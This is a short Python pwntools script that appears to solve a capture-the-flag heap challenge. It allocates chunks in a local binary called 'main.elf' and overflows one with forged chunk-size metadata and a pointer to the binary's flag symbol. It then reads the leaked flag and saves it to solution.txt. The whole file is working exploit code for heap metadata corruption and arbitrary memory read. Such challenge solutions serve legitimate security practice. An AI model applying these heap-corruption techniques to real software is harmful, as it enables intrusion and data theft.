#!/usr/bin/env python
from __future__ import print_function

import pwn

pwn.context.terminal = "tmux splitw -h".split()
pwn.context.arch="amd64"

exe = pwn.context.binary = pwn.ELF('main.elf')
#libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")
#system_offset = libc.sym['system']
#libc_start_main_offset = libc.sym['__libc_start_main']

r = pwn.process("./main.elf".split())
#r = pwn.gdb.debug("./main.elf", gdbscript="b* showChain\nc")

r.sendline("1")
r.sendline("a")
r.sendline("16")
r.sendline("\xaa" * 16)

r.sendline("1")
r.sendline("b")
r.sendline("16")
r.sendline("\xbb" * 16)

r.sendline("3")
r.sendline("a")
r.sendline("a")
r.sendline("48")

payload = "\xaa" * 16
payload += pwn.p64(16 + 16)
payload += pwn.p64((32 + 16) | 0x1)
payload += pwn.p64(16)
payload += pwn.p64(exe.symbols.flag)

r.sendline(payload)

r.sendline("4")

#r.interactive()

r.recvuntil("=== Block chain ===\n")

flag = r.recvline(timeout=60)
print(flag)
r.close()

f = open("./solution.txt", "w")
f.write(flag)
f.close()

